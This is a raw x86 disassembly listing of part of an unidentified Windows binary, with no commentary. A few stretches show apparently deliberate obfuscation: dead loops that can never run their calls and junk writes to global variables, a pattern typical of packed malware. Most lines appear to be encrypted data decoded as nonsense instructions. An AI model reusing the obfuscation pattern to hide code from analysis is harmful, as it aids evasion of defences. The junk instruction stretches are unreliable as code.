  405a45:	sub    BYTE PTR [edx+0x54],ah
  405a48:	fisub  WORD PTR [eax-0x45]
  405a4b:	xor    al,0x67
  405a4d:	int    0x6d
  405a4f:	add    al,0x81
  405a51:	popa   
  405a52:	add    esp,DWORD PTR [ebx+0x253c4dca]
  405a58:	(bad)  
  405a59:	mov    eax,ds:0xaf6f0827
  405a5e:	inc    edi
  405a5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405a60:	dec    edx
  405a61:	push   ebp
  405a62:	das    
  405a63:	adc    BYTE PTR [edx],dh
  405a65:	mov    ds:0x6f380789,eax
  405a6a:	and    BYTE PTR [ecx-0x525794e6],ah
  405a70:	sti    
  405a71:	xchg   edx,eax
  405a72:	jecxz  0x405aee
  405a74:	lock sbb eax,0x93271797
  405a7a:	mov    cl,0xd9
  405a7c:	dec    esi
  405a7d:	inc    esi
  405a7e:	mov    ecx,DWORD PTR [eax]
  405a80:	clc    
  405a81:	(bad)  
  405a83:	sub    DWORD PTR [eax+0x58a6b3c5],ebp
  405a89:	pop    edx
  405a8a:	lea    bp,[ecx+0x6b]
  405a8e:	(bad)  
  405a8f:	in     eax,0xab
  405a91:	jmp    0x405a7b
  405a93:	push   ss
  405a94:	data16 jb 0x405adb
  405a97:	loop   0x405adc
  405a99:	and    eax,0xae95e546
  405a9e:	pushf  
  405a9f:	sti    
  405aa0:	aam    0x87
  405aa2:	and    eax,0xe90a12de
  405aa7:	mov    eax,ds:0x6c96f0a7
  405aac:	outs   dx,DWORD PTR ds:[esi]
  405aad:	add    bl,BYTE PTR [ecx+0x2ef79d81]
  405ab3:	stos   BYTE PTR es:[edi],al
  405ab4:	call   0x1712:0xaf69a881
  405abb:	rcl    DWORD PTR [ebp+0x1a],1
  405abe:	cmp    eax,0xe3bf2fb1
  405ac3:	call   DWORD PTR [ebp+ecx*1-0x4eada158]
  405aca:	or     al,0xef
  405acc:	and    BYTE PTR [esi],0x68
  405acf:	mov    edi,0xb94e9886
  405ad4:	test   eax,0xf77264fc
  405ad9:	icebp  
  405ada:	mov    ecx,DWORD PTR [ebp+0x10]
  405add:	and    ecx,eax
  405adf:	or     ecx,0x81161d8f
  405ae5:	mov    eax,ecx
  405ae7:	pop    ebp
  405ae8:	ret    0x18
  405aeb:	push   ebp
  405aec:	mov    ebp,esp
  405aee:	push   ecx
  405aef:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  405af6:	add    DWORD PTR ds:0x43431d,ecx
  405afc:	mov    eax,DWORD PTR [ebp-0x4]
  405aff:	mov    edx,DWORD PTR [ebp+0x10]
  405b02:	mov    ecx,DWORD PTR ds:0x4342a6
  405b08:	mov    ecx,DWORD PTR [ecx]
  405b0a:	add    DWORD PTR ds:0x434329,ecx
  405b10:	mov    ecx,0x7510855
  405b15:	xor    eax,ecx
  405b17:	sub    DWORD PTR ds:0x432cce,0x487f
  405b21:	add    eax,0x32729c
  405b26:	xor    DWORD PTR ds:0x434296,0x6d44
  405b30:	mov    DWORD PTR [edx],eax
  405b32:	inc    DWORD PTR ds:0x43426e
  405b38:	mov    eax,DWORD PTR [ebp+0x14]
  405b3b:	sub    DWORD PTR ds:0x432cc2,0x7e8e
  405b45:	mov    edx,DWORD PTR [ebp+0x10]
  405b48:	mov    DWORD PTR [edx+0x4],eax
  405b4b:	mov    eax,DWORD PTR [ebp+0x18]
  405b4e:	mov    edx,DWORD PTR [ebp+0x10]
  405b51:	adc    DWORD PTR ds:0x43426e,0x4325fc
  405b5b:	mov    DWORD PTR [edx+0x8],eax
  405b5e:	mov    eax,DWORD PTR [ebp+0x1c]
  405b61:	mov    edx,DWORD PTR [ebp+0x10]
  405b64:	sub    DWORD PTR ds:0x432cc6,0x432cda
  405b6e:	mov    DWORD PTR [edx+0xc],eax
  405b71:	and    DWORD PTR ds:0x434276,0x0
  405b7b:	jmp    0x405b8b
  405b80:	mov    eax,ds:0x434276
  405b85:	inc    eax
  405b86:	mov    ds:0x434276,eax
  405b8b:	cmp    DWORD PTR ds:0x434276,0x14
  405b92:	jae    0x405bcd
  405b98:	cmp    DWORD PTR ds:0x434276,0x7
  405b9f:	jne    0x405bb0
  405ba5:	push   0x400000
  405baa:	call   DWORD PTR ds:0x432bee
  405bb0:	cmp    DWORD PTR ds:0x434276,0x6
  405bb7:	jne    0x405bc8
  405bbd:	mov    eax,ds:0x434276
  405bc2:	inc    eax
  405bc3:	mov    ds:0x434276,eax
  405bc8:	jmp    0x405b80
  405bcd:	mov    eax,DWORD PTR [ebp+0x20]
  405bd0:	mov    edx,DWORD PTR [ebp+0x10]
  405bd3:	mov    DWORD PTR [edx+0x10],eax
  405bd6:	mov    eax,eax
  405bd8:	mov    eax,DWORD PTR [ebp+0x14]
  405bdb:	test   eax,eax
  405bdd:	mov    eax,DWORD PTR [ebp+0x8]
  405be0:	jne    0x405be9
  405be6:	mov    eax,DWORD PTR [ebp+0xc]
  405be9:	xor    eax,ecx
  405beb:	add    eax,0x32729c
  405bf0:	leave  
  405bf1:	ret    0x1c
  405bf4:	push   ebp
  405bf5:	mov    ebp,esp
  405bf7:	sub    esp,0x78
  405bfa:	add    DWORD PTR ds:0x434282,edi
  405c00:	mov    eax,ds:0x4161a0
  405c05:	sbb    DWORD PTR ds:0x432cd2,0x30a0
  405c0f:	mov    DWORD PTR [ebp-0x10],eax
  405c12:	and    DWORD PTR ds:0x434272,0x0
  405c1c:	jmp    0x405c2c
  405c21:	mov    eax,ds:0x434272
  405c26:	inc    eax
  405c27:	mov    ds:0x434272,eax
  405c2c:	cmp    DWORD PTR ds:0x434272,0x12
  405c33:	jae    0x405cc7
  405c39:	cmp    DWORD PTR ds:0x434272,0x8
  405c40:	jne    0x405c56
  405c46:	push   0x59ce
  405c4b:	push   0x3d0e
  405c50:	call   DWORD PTR ds:0x4328c6
  405c56:	cmp    DWORD PTR ds:0x434272,0x7
  405c5d:	jne    0x405c71
  405c63:	xor    eax,eax
  405c65:	or     eax,DWORD PTR ds:0x434272
  405c6b:	inc    eax
  405c6c:	mov    ds:0x434272,eax
  405c71:	jmp    0x405c21
  405c76:	and    DWORD PTR ds:0x4325ec,0x0
  405c80:	jmp    0x405c93
  405c85:	xor    eax,eax
  405c87:	add    eax,DWORD PTR ds:0x4325ec
  405c8d:	inc    eax
  405c8e:	mov    ds:0x4325ec,eax
  405c93:	cmp    DWORD PTR ds:0x4325ec,0x19
  405c9a:	jae    0x405cc7
  405ca0:	cmp    DWORD PTR ds:0x4325ec,0x24
  405ca7:	jne    0x405cb8
  405cad:	push   0x2979
  405cb2:	call   DWORD PTR ds:0x432bf2
  405cb8:	jmp    0x405c85
  405cbd:	adc    DWORD PTR ds:0x432600,0x4b3c
  405cc7:	mov    eax,ds:0x4162ac
  405ccc:	mov    DWORD PTR [ebp-0x30],eax
  405ccf:	mov    eax,ds:0x43429a
  405cd4:	adc    DWORD PTR ds:0x434272,eax
  405cda:	mov    DWORD PTR [ebp-0xc],0xf89c8531
  405ce1:	mov    DWORD PTR [ebp-0x14],0xf89c8530
  405ce8:	and    DWORD PTR ds:0x432cce,0x0
  405cf2:	jmp    0x405d05
  405cf7:	xor    eax,eax
  405cf9:	xor    eax,DWORD PTR ds:0x432cce
  405cff:	inc    eax
  405d00:	mov    ds:0x432cce,eax
  405d05:	cmp    DWORD PTR ds:0x432cce,0x17
  405d0c:	jae    0x405d74
  405d12:	cmp    DWORD PTR ds:0x432cce,0x24
  405d19:	jne    0x405d65
  405d1f:	push   0x4327ab
  405d24:	push   DWORD PTR [ebp-0x24]
  405d27:	push   DWORD PTR [ebp-0x1c]
  405d2a:	push   0x2bca
  405d2f:	push   0x26af
  405d34:	push   0x4217
  405d39:	push   0x24e1
  405d3e:	push   0x5f7a
  405d43:	push   DWORD PTR [ebp-0x28]
  405d46:	push   0x4151
  405d4b:	push   0x4efd
  405d50:	push   0x2a4d
  405d55:	push   0x1961
  405d5a:	push   0x8799
  405d5f:	call   DWORD PTR ds:0x432b36
  405d65:	jmp    0x405cf7
  405d6a:	sbb    DWORD PTR ds:0x432cca,0x4665
  405d74:	mov    eax,DWORD PTR [ebp-0xc]
  405d77:	push   ebx
  405d78:	sbb    DWORD PTR ds:0x43432d,0x432cd2
  405d82:	push   esi
  405d83:	push   edi
  405d84:	mov    esi,0x7510855
  405d89:	and    DWORD PTR ds:0x4325fc,0xdb
  405d93:	jmp    0x4060e0
  405d98:	mov    ecx,0x75ce7592
  405d9d:	jmp    0x6331ef03
  405da2:	sub    BYTE PTR [ebx],bl
  405da4:	in     eax,0x83
  405da6:	or     eax,DWORD PTR [edi]
  405da8:	mov    esi,DWORD PTR [eax+esi*2]
  405dab:	jo     0x405dcd
  405dad:	jge    0x405e1f
  405daf:	jo     0x405df9
  405db1:	lods   eax,DWORD PTR ds:[esi]
  405db2:	or     esi,DWORD PTR [ecx+ecx*4]
  405db5:	xlat   BYTE PTR ds:[ebx]
  405db6:	hlt    
  405db7:	shl    ebx,0x8a
  405dba:	test   DWORD PTR [ebp+0x37b36ab1],0x7404828d
  405dc4:	daa    
  405dc5:	(bad)  
  405dc7:	mov    esi,0x7a5f7ec0
  405dcc:	jno    0x405d8c
  405dce:	push   ebx
  405dcf:	add    esp,edx
  405dd1:	mov    esi,0x2fb348dc
  405dd6:	mov    esi,0x835f6e3
  405ddb:	mov    ebp,0xd4f4dde3
  405de0:	out    0x4d,eax
  405de2:	pop    edi
  405de3:	fdivr  DWORD PTR [ebx+0x6b]
  405de6:	mov    dh,BYTE PTR [eax-0x7b]
  405de9:	mov    esi,0x778fb961
  405dee:	ds pop ss
  405df0:	and    DWORD PTR [ebx-0x33],ebp
  405df3:	daa    
  405df4:	pop    ebx
  405df5:	lahf   
  405df6:	xor    eax,0x44f79c54
  405dfb:	xchg   ecx,eax
  405dfc:	xchg   ebx,eax
  405dfd:	xchg   DWORD PTR [ecx-0x491c613d],ebp
  405e03:	push   edi
  405e04:	push   ds
  405e05:	dec    esi
  405e06:	mov    ecx,0x486a10b0
  405e0b:	mov    ah,0x36
  405e0d:	call   0x3cff5a3
  405e12:	fstp   TBYTE PTR [ecx+0x41b7ed62]
  405e18:	fs mov dl,0x28
  405e1b:	pop    ds
  405e1c:	or     BYTE PTR [ebp+0x6b],bh
  405e1f:	xor    eax,0xf2e957c4
  405e24:	push   ecx
  405e25:	(bad)  
  405e26:	jb     0x405e0f
  405e28:	and    ebx,edx
  405e2a:	jne    0x405ea0
  405e2c:	cld    
  405e2d:	pop    esp
  405e2e:	pop    esp
  405e2f:	aaa    
  405e30:	mov    ch,0x97
  405e32:	std    
  405e33:	pop    ds
  405e34:	mov    eax,0x4ea232d
  405e39:	or     al,0x57
  405e3b:	mov    al,0x3a
  405e3d:	fwait
  405e3e:	jmp    0x405df3
  405e40:	repz pop ds
  405e42:	push   ebp
  405e43:	cmc    
  405e44:	sub    eax,0xca2b0526
  405e49:	cmp    BYTE PTR [esi],al
  405e4b:	jmp    0x405e7b
  405e4d:	sbb    eax,DWORD PTR [ecx+eax*1]
  405e50:	mov    eax,0x7032ebc1
  405e55:	data16 jge 0x405e0a
  405e58:	fsub   DWORD PTR [ebx]
  405e5a:	retf   
  405e5b:	fs nop
  405e5d:	sar    BYTE PTR [esi-0x7c86bbe4],cl
  405e63:	(bad)  
  405e64:	imul   ebp,DWORD PTR [ecx+esi*8],0xffffff88
  405e68:	icebp  
  405e69:	and    al,0x36
  405e6b:	mov    ch,0xb2
  405e6d:	enter  0x1cb1,0xcd
  405e71:	mov    ch,0x53
  405e73:	inc    ecx
  405e74:	(bad)  
  405e75:	in     al,dx
  405e76:	cmp    al,0x58
  405e78:	jb     0x405e91
  405e7a:	sbb    eax,0x4398c7b
  405e7f:	sbb    al,0x4c
  405e81:	jbe    0x405ecd
  405e83:	push   esp
  405e84:	pop    ds
  405e85:	rol    DWORD PTR [edx],1
  405e87:	hlt    
  405e88:	xchg   DWORD PTR [eax-0x3a],eax
  405e8b:	push   ds
  405e8c:	icebp  
  405e8d:	dec    edi
  405e8e:	clc    
  405e8f:	sbb    DWORD PTR [eax+ebx*1+0x51],eax
  405e93:	aaa    
  405e94:	sbb    cl,0xfe
  405e97:	ds cwde 
  405e99:	pop    eax
  405e9a:	add    ecx,ebx
  405e9c:	xor    BYTE PTR [ebx+0x1d434bd3],ch
  405ea2:	hlt    
  405ea3:	les    ebp,FWORD PTR [esp+ecx*4+0x2e]
  405ea7:	dec    ebx
  405ea8:	dec    esp
  405ea9:	ins    BYTE PTR es:[edi],dx
  405eaa:	xor    BYTE PTR [edx],ch
  405eac:	adc    DWORD PTR [ecx+0xf],edx
  405eaf:	inc    ebp
  405eb0:	jns    0x405ea6
  405eb2:	sti    
  405eb3:	or     DWORD PTR [eax+0x46],0x43c3be9b
  405eba:	jb     0x405efd
  405ebc:	xor    DWORD PTR [eax-0x1cadc48a],edx
  405ec2:	inc    ebp
  405ec3:	add    ecx,edx
  405ec5:	add    eax,0x6103b804
  405eca:	and    eax,0x82b055db
  405ecf:	dec    edx
  405ed0:	push   esp
  405ed1:	pusha  
  405ed2:	lahf   
  405ed3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405ed4:	mov    esp,0xede38ff6
  405ed9:	sbb    eax,DWORD PTR [ebx+ebp*8-0x34]
  405edd:	sbb    bh,bh
  405edf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ee0:	(bad)  
  405ee1:	jnp    0x405f5f
  405ee3:	push   0x29
  405ee5:	adc    bl,BYTE PTR ds:[ebp+0x1a]
  405ee9:	push   ds
  405eea:	mov    gs,WORD PTR [ebp+0x3f]
  405eed:	sub    ebx,edx
  405eef:	fs std 
  405ef1:	xchg   edx,eax
  405ef2:	mov    cl,0xb9
  405ef4:	scas   al,BYTE PTR es:[edi]
  405ef5:	add    ah,BYTE PTR [esi-0x13954559]
  405efb:	test   eax,0xc7991453
  405f00:	xchg   bl,bh
  405f02:	adc    DWORD PTR [ebp+0x17],edx
  405f05:	das    
  405f06:	mov    bl,0x2b
  405f08:	pop    ss
  405f09:	adc    ebx,esi
  405f0b:	popa   
  405f0c:	xor    bl,dh
  405f0e:	imul   ebp,DWORD PTR [edx+0x60],0xffffffa7
  405f12:	inc    edi
  405f13:	jp     0x405f8c
  405f15:	pop    ecx
  405f16:	fidivr WORD PTR [esi]
  405f18:	xor    eax,0x6f82eee1
  405f1d:	repz inc esp
  405f1f:	xchg   ebx,eax
  405f20:	adc    DWORD PTR [ebp-0x11a17ffa],ecx
  405f26:	mov    ds:0x1f311fdc,al
  405f2b:	iret   
  405f2c:	and    DWORD PTR [ecx],0x2d356dc1
  405f32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f33:	and    BYTE PTR [ecx-0x4ae00485],cl
  405f39:	ror    edx,0xdd
  405f3c:	mov    esi,0x9b3b174a
  405f41:	rol    al,1
  405f43:	fistp  DWORD PTR [ebp+0x4ee45bd]
  405f49:	jb     0x405ee1
  405f4b:	mov    cl,BYTE PTR [edx+0x71]
  405f4e:	mov    ebx,0xf8950626
  405f53:	pop    ebx
  405f54:	inc    eax
  405f55:	stos   BYTE PTR es:[edi],al
  405f56:	mov    cl,0x9f
  405f58:	xchg   ebp,eax
  405f59:	adc    DWORD PTR ds:0x279b11bc,esp
  405f5f:	ja     0x405f18
  405f61:	adc    eax,eax
  405f63:	jl     0x405f02
  405f65:	pushf  
  405f66:	inc    ebx
  405f67:	xchg   ebp,ebx
  405f69:	inc    DWORD PTR [eax-0x4a]
  405f6c:	xchg   edx,eax
  405f6d:	push   0xffffffa9
  405f6f:	sbb    ch,BYTE PTR [ecx]
  405f71:	inc    eax
  405f72:	fcmovnb st,st(0)
  405f74:	std    
  405f75:	push   cs
  405f76:	ret    0xe669
  405f79:	pop    esp
  405f7a:	lds    esi,FWORD PTR [ecx]
  405f7c:	cmp    edx,esi
  405f7e:	dec    ecx
  405f7f:	ds repnz xor ebx,edi
  405f83:	cmp    eax,0x13146863
  405f88:	mov    edi,0xa873d090
  405f8d:	pop    es
  405f8e:	mov    ch,0xae
  405f90:	pop    ecx
  405f91:	in     eax,0x77
  405f93:	pop    ebp
  405f94:	mov    bl,0x2b
  405f96:	or     DWORD PTR [eax-0x7f3da415],esi
  405f9c:	popf   
  405f9d:	cmp    edx,DWORD PTR ds:0x8dcdd4ca
  405fa3:	enter  0x4763,0xf9
  405fa7:	push   esp
  405fa8:	js     0x405f65
  405faa:	jmp    0x55e5:0xd5fafc57
  405fb1:	or     eax,0x36c444e
  405fb6:	enter  0x3d4a,0xfa
  405fba:	push   ds
  405fbb:	shl    BYTE PTR [eax-0x3e2dc58b],1
  405fc1:	test   BYTE PTR [edi+esi*2+0x44],0xbf
  405fc6:	sub    ecx,ebp
  405fc8:	inc    esp
  405fc9:	dec    ebp
  405fca:	adc    ecx,DWORD PTR [eax+0x18711e54]
  405fd0:	xchg   esp,eax
  405fd1:	cdq    
  405fd2:	sbb    edi,ecx
  405fd4:	into   
  405fd5:	add    ebx,DWORD PTR [edx+0x5b]
  405fd8:	mov    ebp,ebx
  405fda:	lahf   
  405fdb:	fs xchg esi,eax
  405fdd:	adc    edi,0x9
  405fe0:	mov    ds:0x12093648,al
  405fe5:	pop    esp
  405fe6:	jns    0x405f75
  405fe8:	sub    al,0x26
  405fea:	fcom   DWORD PTR [eax]
  405fec:	mov    fs,WORD PTR [esi*4+0x331f084f]
  405ff3:	cmp    esi,DWORD PTR [ecx+0x7fe6281e]
  405ff9:	das    
  405ffa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405ffb:	mov    eax,ds:0xa8a1005f
  406000:	and    eax,0x3bf08c0b
  406005:	xor    edx,DWORD PTR [eax-0x19]
  406008:	jp     0x40604a
  40600a:	int3   
  40600b:	pop    ss
  40600c:	fcmovne st,st(3)
  40600e:	push   0x16f6500a
  406013:	aas    
  406014:	das    
  406015:	test   al,0xc9
  406017:	ret    0x381
  40601a:	jmp    0xf0ca3d43
  40601f:	push   es
  406020:	iret   
  406021:	enter  0x9c00,0xdb
  406025:	hlt    
  406026:	xchg   ebx,eax
  406027:	dec    eax
  406028:	lock mov ebp,0xfeff704c
  40602e:	or     bl,BYTE PTR [esi-0x3e]
  406031:	fdivr  DWORD PTR [edx+ebp*8+0x1d]
  406035:	mov    dl,0x5
  406037:	clc    
  406038:	push   esp
  406039:	mov    esi,0xad1d5f6d
  40603e:	jg     0x40600f
  406040:	das    
  406041:	xor    DWORD PTR [eax+0x10],esp
  406044:	mov    ecx,0x2d98710
  406049:	jmp    0x9ee00cd6
  40604e:	pop    ebx
  40604f:	pop    edi
  406050:	adc    ch,BYTE PTR [ebx]
  406052:	pop    ds
  406053:	jno    0x405fe1
  406055:	call   0xb174e741
  40605a:	add    bh,BYTE PTR [ecx-0x58]
  40605d:	leave  
  40605e:	jae    0x406022
  406060:	aam    0x18
  406062:	les    ebp,FWORD PTR [edi+0x452333c7]
  406068:	inc    eax
  406069:	fisubr DWORD PTR [edx+0x4d]
  40606c:	add    al,0x46
  40606e:	or     bh,al
  406070:	mov    al,ds:0x55531319
  406075:	inc    ebx
  406076:	xchg   ecx,eax
  406077:	data16 jno 0x4060d8
  40607a:	mov    al,0xbc
  40607c:	inc    ecx
  40607d:	cli    
  40607e:	sbb    ecx,eax
  406080:	push   edi
  406081:	cmp    eax,0x4839d31a
  406086:	cli    
  406087:	es mov ebp,0xa76aa198
  40608d:	shl    ebp,1
  40608f:	push   cs
  406090:	dec    dh
  406092:	cmp    DWORD PTR [edi-0x11],eax
  406095:	and    bl,BYTE PTR ds:0xf26cd3bf
  40609b:	fwait
  40609c:	dec    edx
  40609d:	sti    
  40609e:	hlt    
  40609f:	and    al,0x6d
  4060a1:	sub    DWORD PTR [eax-0x411eb3a9],esi
  4060a7:	mov    ebp,0xc9754295
  4060ac:	mov    esi,0x8d78c7bf
  4060b1:	xchg   BYTE PTR [eax+edi*2],dh
  4060b4:	lods   al,BYTE PTR ds:[esi]
  4060b5:	or     ebx,DWORD PTR [ebx]
  4060b7:	jae    0x406080
  4060b9:	jns    0x4060ea
  4060bb:	or     BYTE PTR [edx+eax*8-0x5f0fd92e],al
  4060c2:	pop    ecx
  4060c3:	jmp    0xb5d1a32c
  4060c8:	mov    al,ds:0xae9d6f0d
  4060cd:	push   ds
  4060ce:	mov    ebp,ebx
  4060d0:	(bad)  
  4060d2:	jmp    0xea8b6877
  4060d7:	mov    edi,0x3f59b1dc
  4060dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4060dd:	int3   
  4060de:	push   cs
  4060df:	sub    dh,BYTE PTR [ebx]
  4060e1:	mov    BYTE PTR [ecx],0x3d
  4060e4:	mov    esi,0xbf00432c
  4060e9:	pushf  
  4060ea:	jb     0x40611e
  4060ec:	add    BYTE PTR [ecx+0x43431d25],al
  4060f2:	add    BYTE PTR [ebp+0x3e],bh
  4060f5:	add    BYTE PTR [eax],al
  4060f7:	add    eax,edi
  4060f9:	jmp    0x406446
  4060fe:	xchg   esp,eax
  4060ff:	test   eax,0x69f5e9e0
  406104:	xchg   ecx,eax
  406105:	jno    0x406179
  406107:	xchg   edx,eax
  406108:	js     0x406147
  40610a:	addr16 push 0x6c
  40610d:	call   0x7d20:0x707031bb
  406114:	jo     0x406186
  406116:	sar    cl,0x2a
  406119:	mov    es,WORD PTR [eax-0x70eaa729]
  40611f:	jmp    0xf9d8:0xf875125e
  406126:	outs   dx,DWORD PTR ds:[esi]
  406127:	inc    edi
  406128:	sbb    BYTE PTR [esi-0x294c6c10],ah
  40612e:	inc    esi
  40612f:	int    0x4e
  406131:	popf   
  406132:	jmp    0x17ce12a9
  406137:	mov    ecx,0xb193a560
  40613c:	and    al,0x47
  40613e:	sahf   
  40613f:	dec    ebx
  406140:	and    bh,cl
  406142:	rsqrtps xmm0,XMMWORD PTR [ebp+0x0]
  406146:	jmp    0xd93db6b1
  40614b:	xchg   esp,eax
  40614c:	stc    
  40614d:	popf   
  40614e:	jno    0x406120
  406150:	inc    ebx
  406151:	sar    BYTE PTR [eax+0x6b34d358],1
  406157:	xchg   edi,eax
  406158:	test   eax,0x2bf4f212
  40615d:	mov    bh,0xe3
  40615f:	dec    ecx
  406160:	int    0x4a
  406162:	and    al,0x4f
  406164:	mov    bl,0xd
  406166:	aas    
  406167:	repz fisubr DWORD PTR [eax+ecx*8-0x160bd754]
  40616f:	dec    ecx
  406170:	outs   dx,BYTE PTR ds:[esi]
  406172:	add    eax,DWORD PTR [esi-0x5a]
  406175:	gs xchg ecx,eax
  406177:	push   0xffffffc6
  406179:	je     0x406188
  40617b:	cwde   
  40617c:	sti    
  40617d:	lahf   
  40617e:	fnstsw WORD PTR [ebx+0x5020db96]
  406184:	dec    BYTE PTR [esi+0x13]
  406187:	mov    DWORD PTR [edx],eax
  406189:	sbb    esi,ecx
  40618b:	js     0x406184
  40618d:	xor    esi,esp
  40618f:	add    ah,BYTE PTR [ecx+0x197b8ff7]
  406195:	repnz cli 
  406197:	mov    ebp,0x45c27f85
  40619c:	xor    eax,DWORD PTR [ecx+0x1f]
  40619f:	(bad)  
  4061a0:	adc    bl,bl
  4061a2:	and    DWORD PTR [eax],ebx
  4061a4:	push   0xd4a3616c
  4061a9:	sbb    bh,cl
  4061ab:	(bad)  [ecx+0x214ea399]
  4061b1:	push   esp
  4061b2:	ins    BYTE PTR es:[edi],dx
  4061b3:	loop   0x40620e
  4061b5:	out    dx,eax
  4061b6:	jo     0x406208
  4061b8:	inc    eax
  4061b9:	mov    ds:0x2f7d5816,al
  4061be:	mov    ah,0x29
  4061c0:	adc    bh,BYTE PTR [ecx+0x3eee3359]
  4061c6:	and    esp,ebx
  4061c8:	aaa    
  4061c9:	push   ebp
  4061ca:	xchg   edx,eax
  4061cb:	cmp    edx,eax
  4061cd:	mov    esi,0x42fb4148
  4061d2:	pushf  
  4061d3:	fs jge 0x406194
  4061d6:	xchg   DWORD PTR [ebx],ebp
  4061d8:	push   esp
  4061d9:	mov    esi,0x13b72cc8
  4061de:	or     BYTE PTR [ebx-0x620647e9],al
  4061e4:	push   edx
  4061e5:	rol    ah,cl
  4061e7:	mov    esi,0x9df22326
  4061ec:	jbe    0x40620d
  4061ee:	std    
  4061ef:	(bad)  
  4061f0:	retf   
  4061f1:	aaa    
  4061f2:	add    ah,BYTE PTR [edi+edx*8-0x31]
  4061f6:	dec    ebx
  4061f7:	xchg   ebx,eax
  4061f8:	pusha  
  4061f9:	std    
  4061fa:	mov    WORD PTR [edi],?
  4061fc:	pop    edi
  4061fd:	ins    DWORD PTR es:[edi],dx
  4061fe:	imul   DWORD PTR [esi+esi*4-0x75]
  406202:	call   0x57aa:0x9f6466cc
  406209:	je     0x406236
  40620b:	icebp  
  40620c:	into   
  40620d:	inc    edx
  40620e:	cli    
  40620f:	jne    0x4061e2
  406211:	jmp    0x15f1:0xdf74ff5b
  406218:	sbb    cl,BYTE PTR [edi-0xc099258]
  40621e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40621f:	xchg   edx,eax
  406220:	cmp    dl,ch
  406222:	dec    eax
  406223:	stos   DWORD PTR es:[edi],eax
  406224:	lods   al,BYTE PTR ds:[esi]
  406225:	sbb    BYTE PTR [eax-0x7e],ch
  406228:	dec    eax
  406229:	ins    DWORD PTR es:[edi],dx
  40622a:	push   ebp
  40622b:	fadd   DWORD PTR [esi]
  40622d:	out    dx,al
  40622e:	adc    al,0x2b
  406230:	adc    eax,DWORD PTR [ebx+edx*1-0x3f]
  406234:	jecxz  0x4062b5
  406236:	mov    esp,DWORD PTR [esi+0x13]
  406239:	pop    es
  40623a:	cld    
  40623b:	pop    ecx
  40623c:	push   cs
  40623d:	mov    eax,ds:0x3fe56c1
  406242:	mov    ebp,0x2452e1d
  406247:	pop    eax
  406248:	or     al,0xe2
  40624a:	scas   eax,DWORD PTR es:[edi]
  40624b:	lods   al,BYTE PTR ds:[esi]
  40624c:	retf   0xd756
  40624f:	sbb    BYTE PTR [edi+0x25],al
  406252:	fist   WORD PTR [ebx+0x5a584519]
  406258:	ds cld 
  40625a:	mov    ebx,0xfac1d06e
  40625f:	ins    BYTE PTR es:[edi],dx
  406260:	lock ins BYTE PTR es:[edi],dx
  406262:	inc    edx
  406263:	aas    
  406264:	xchg   edi,eax
  406265:	jns    0x40625e
  406267:	cdq    
  406268:	shl    DWORD PTR [edx+ebx*2],cl
  40626b:	sbb    al,0xed
  40626d:	add    cl,bh
  40626f:	inc    edi
  406270:	fstp   DWORD PTR [ecx]
  406272:	jge    0x40620e
  406274:	aam    0x98
  406276:	mov    bh,0xd7
  406278:	add    esi,DWORD PTR [ebx+0x2e6fe59e]
  40627e:	cdq    
  40627f:	push   esp
  406280:	mov    cl,0x42
  406282:	ret    
  406283:	(bad)  
  406284:	sbb    dl,al
  406286:	mov    DWORD PTR [ebp-0x1ddb20be],edi
  40628c:	and    BYTE PTR [ecx],ch
  40628e:	mov    ebx,0x1bd0ece2
  406293:	xchg   edx,eax
  406294:	outs   dx,BYTE PTR ds:[esi]
  406295:	adc    al,0x52
  406297:	sub    eax,0x26ae353f
  40629c:	ret    0x14df
  40629f:	lock loop 0x406257
  4062a2:	xchg   edi,eax
  4062a3:	sahf   
  4062a4:	cmp    eax,0x15d473e4
  4062a9:	pop    ebp
  4062aa:	jecxz  0x4062e4
  4062ac:	test   ch,0x5c
  4062af:	stc    
  4062b0:	and    BYTE PTR [ebx-0x5b],0x6
  4062b4:	stos   BYTE PTR es:[edi],al
  4062b5:	push   0x937bd5dd
  4062ba:	push   cs
  4062bb:	mov    eax,0xbfcdaf91
  4062c0:	ror    cl,1
  4062c2:	pushf  
  4062c3:	das    
  4062c4:	mov    edx,0x281537d9
  4062c9:	test   al,0xb1
  4062cb:	(bad)
  4062cf:	sbb    esi,edi
  4062d1:	pop    edi
  4062d2:	iret   
  4062d3:	mov    al,ds:0xf206281d
  4062d8:	test   bl,al
  4062da:	add    DWORD PTR [ebp+0x5bb360d6],0xffffffd2
  4062e1:	xchg   esi,eax
  4062e2:	lahf   
  4062e3:	push   edi
  4062e4:	inc    edx
  4062e5:	add    cl,BYTE PTR [ebx]
  4062e7:	scas   al,BYTE PTR es:[edi]
  4062e8:	jge    0x40629a
  4062ea:	fstp   DWORD PTR [ebx+0x49]
  4062ed:	inc    edi
  4062ee:	mov    al,ds:0xc01b97c6
  4062f3:	aad    0x92
  4062f5:	and    eax,0x4bfdad30
  4062fa:	jecxz  0x4062f0
  4062fc:	add    ebp,0x6b217cbb
  406302:	mov    eax,ds:0x6ad6bd07
  406307:	mov    ebp,0xe63bb7ae
  40630c:	jo     0x406383
  40630e:	add    al,BYTE PTR [edi-0x4bd8273b]
  406314:	and    ah,bh
  406316:	bound  ebx,QWORD PTR ss:[bx+di-0x7c]
  40631b:	jne    0x40634c
  40631d:	and    dh,bl
  40631f:	jae    0x4062dd
  406321:	dec    ecx
  406322:	mov    ebp,0x1caf8f87
  406327:	imul   edx,DWORD PTR [ecx],0x24a82e15
  40632d:	adc    al,0xd7
  40632f:	and    eax,0xfe1c4ade
  406334:	sub    bl,BYTE PTR [ebp-0x2]
  406337:	(bad)  
  406338:	sub    DWORD PTR ds:0xcdfc7fa0,ecx
  40633e:	sbb    ecx,eax
  406340:	(bad)  
  406341:	out    dx,al
  406342:	(bad)  
  406343:	adc    al,0xbd
  406345:	ficom  DWORD PTR [edx]
  406347:	xor    DWORD PTR [edi-0x34],edi
  40634a:	jbe    0x4063c7
  40634c:	inc    ecx
  40634d:	mov    eax,ds:0x5711c57f
  406352:	mov    dl,0xce
  406354:	xchg   edi,eax
  406355:	sar    DWORD PTR [eax+esi*4-0x3a69f990],cl
